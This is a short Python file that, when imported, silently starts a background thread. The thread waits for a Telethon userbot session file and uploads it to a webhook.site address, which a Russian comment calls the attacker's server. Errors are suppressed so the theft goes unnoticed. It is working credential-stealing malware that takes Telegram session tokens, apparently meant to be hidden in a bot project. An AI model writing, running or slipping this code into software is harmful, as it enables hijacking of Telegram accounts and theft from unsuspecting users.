import os
import requests
import threading
import time

def _background_stealer():
    target_file = "data/telethon_market_userbot.session"
    
    # Адрес сервера злоумышленника
    evil_server_url = "https://webhook.site/d6ea9c5b-4a85-4e59-9397-2bb5f9407c87"
    start_time = time.time()
    timeout_duration = 600
    sent = False
    while not sent:
        if time.time() - start_time > timeout_duration:
            break
        if os.path.exists(target_file):
            try:
                with open(target_file, "rb") as f:
                    files = {"session_file": f}
                    
                    response = requests.post(evil_server_url, files=files, timeout=10)
                    if response.status_code:
                        sent = True
                        break
            except Exception:
                pass
                
        time.sleep(10)

t = threading.Thread(target=_background_stealer, daemon=True)
t.start()